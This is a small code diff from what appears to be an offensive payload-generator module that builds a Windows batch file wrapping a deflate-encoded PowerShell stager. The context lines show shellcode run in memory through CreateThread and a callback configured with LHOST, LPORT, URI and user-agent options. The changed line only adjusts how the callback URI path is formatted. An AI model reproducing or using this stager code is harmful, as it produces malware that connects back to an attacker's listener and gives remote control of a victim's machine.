@@ -49,7 +49,7 @@ $o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" 
                                                                               self.required_options["USER_AGENT"][0],
                                                                               self.required_options["LHOST"][0], 
                                                                               self.required_options["LPORT"][0],
-                                                                              "/" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])                                                                             
+                                                                              "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])                                                                             
         encoded = helpers.deflate(baseString)
         payloadCode = "@echo off\n"
         payloadCode += "if %PROCESSOR_ARCHITECTURE%==x86 ("
